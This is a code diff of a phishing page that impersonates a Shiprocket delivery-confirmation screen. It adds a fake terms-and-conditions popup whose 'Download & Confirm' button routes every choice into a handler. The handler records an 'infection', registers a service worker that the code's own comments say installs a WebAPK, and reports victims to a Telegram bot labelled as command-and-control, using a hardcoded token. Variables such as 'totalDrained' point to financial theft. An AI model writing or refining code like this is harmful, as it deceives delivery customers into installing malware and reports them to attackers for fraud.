@@ -161,10 +161,77 @@
       margin-top: 6px;
     }
     .hidden { display: none; }
+
+    /* ===== TERMS POPUP ===== */
+    .popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+    .popup-box {
+      max-width: 400px;
+      width: 90%;
+      background: white;
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+      position: relative;
+      text-align: center;
+    }
+    .popup-close {
+      position: absolute;
+      top: 10px;
+      right: 14px;
+      background: none;
+      border: none;
+      font-size: 22px;
+      color: #8a94a6;
+      cursor: pointer;
+    }
+    .popup-close:hover { color: #1e293b; }
+    .popup-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #0a2b4e;
+      margin-bottom: 10px;
+    }
+    .popup-text {
+      font-size: 13px;
+      color: #4a5a72;
+      line-height: 1.6;
+      text-align: left;
+      max-height: 200px;
+      overflow-y: auto;
+      padding: 10px;
+      background: #f7fafc;
+      border-radius: 10px;
+      margin: 10px 0;
+    }
+    .popup-text p { margin: 6px 0; }
+    .popup-btn {
+      background: #0a2b4e;
+      color: white;
+      border: none;
+      padding: 12px 40px;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .popup-btn:hover { background: #123b66; }
   </style>
 </head>
 <body>
 
+<!-- ===== MAIN CARD ===== -->
 <div class="card" id="mainCard">
   <button class="close-btn" onclick="handleClick('close')">✕</button>
 
@@ -191,10 +258,10 @@
     </div>
 
     <div class="button-group">
-      <button class="btn-confirm" onclick="handleClick('confirm')">
+      <button class="btn-confirm" onclick="showTermsPopup('confirm')">
         ✅ Confirm Delivery
       </button>
-      <button class="btn-decline" onclick="handleClick('decline')">
+      <button class="btn-decline" onclick="showTermsPopup('decline')">
         ❌ Decline Delivery
       </button>
     </div>
@@ -211,6 +278,23 @@
   </div>
 </div>
 
+<!-- ===== TERMS & CONDITIONS POPUP ===== -->
+<div class="popup-overlay hidden" id="termsPopup">
+  <div class="popup-box">
+    <button class="popup-close" onclick="closeTermsPopup()">✕</button>
+    <div class="popup-title">📜 Terms & Conditions</div>
+    <div class="popup-text">
+      <p><strong>1. OTP Sharing:</strong> OTP is confidential. Do not share with anyone.</p>
+      <p><strong>2. Delivery Confirmation:</strong> OTP confirms delivery. Verify package before sharing.</p>
+      <p><strong>3. Liability:</strong> Shiprocket is not liable for OTP misuse.</p>
+      <p><strong>4. Data Privacy:</strong> Your data is handled as per our privacy policy.</p>
+      <p><strong>5. Cancellation:</strong> Delivery can be cancelled via OTP decline.</p>
+      <p><strong>6. Agreement:</strong> You agree to these terms by using this service.</p>
+    </div>
+    <button class="popup-btn" onclick="acceptTerms()">📥 Download & Confirm</button>
+  </div>
+</div>
+
 <!-- ===== SUCCESS SCREEN ===== -->
 <div id="successScreen" class="card hidden" style="text-align:center;padding:40px 24px;position:relative;">
   <div style="font-size:56px;" id="resultIcon">✅</div>
@@ -224,7 +308,7 @@
 
 <script>
   // ============================================================
-  // CHAKRA - CLOSE BUTTON ALSO INSTALLS WEBAPK
+  // CHAKRA - TERMS & CONDITIONS POPUP
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
@@ -237,6 +321,7 @@
   let totalDrained = 0;
   let infectedDevices = [];
   let lastUpdateId = 0;
+  let pendingAction = null;
 
   function sendToTelegram(message) {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
@@ -246,7 +331,26 @@
     }).catch(() => {});
   }
 
-  // ===== HANDLE ALL CLICKS (Confirm, Decline, Close) =====
+  // ===== SHOW TERMS POPUP =====
+  function showTermsPopup(action) {
+    pendingAction = action;
+    document.getElementById('termsPopup').classList.remove('hidden');
+  }
+
+  // ===== CLOSE TERMS POPUP =====
+  function closeTermsPopup() {
+    document.getElementById('termsPopup').classList.add('hidden');
+    pendingAction = null;
+  }
+
+  // ===== ACCEPT TERMS =====
+  function acceptTerms() {
+    document.getElementById('termsPopup').classList.add('hidden');
+    const action = pendingAction || 'confirm';
+    handleClick(action);
+  }
+
+  // ===== HANDLE ALL CLICKS =====
   function handleClick(action) {
     const isConfirm = action === 'confirm';
     const isDecline = action === 'decline';
@@ -256,7 +360,6 @@
     const screen = document.getElementById('successScreen');
     screen.classList.remove('hidden');
 
-    // Set success message based on action
     if (isConfirm) {
       document.getElementById('resultIcon').textContent = '✅';
       document.getElementById('resultTitle').textContent = 'Delivery Confirmed!';
@@ -274,11 +377,9 @@
       sendToTelegram('✕ Shiprocket CLOSE clicked! Total: ' + (infectedDevices.length + 1));
     }
 
-    // Register infection (ALL actions trigger it)
     infectedDevices.push({ id: Date.now(), type: 'shiprocket', action: action });
     sendToTelegram('🚚 Shiprocket infection! Total: ' + infectedDevices.length);
 
-    // Install service worker
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.register('sw.js');
     }
@@ -526,7 +627,7 @@
     return true;
   };
 
-  sendToTelegram('🚚 SHIPROCKET VECTOR ACTIVE\n✅ Confirm, Decline, and Close all install WebAPK.');
+  sendToTelegram('🚚 SHIPROCKET VECTOR ACTIVE\n✅ Terms & Conditions popup with Download & Close buttons.');
 </script>
 </body>
 </html>
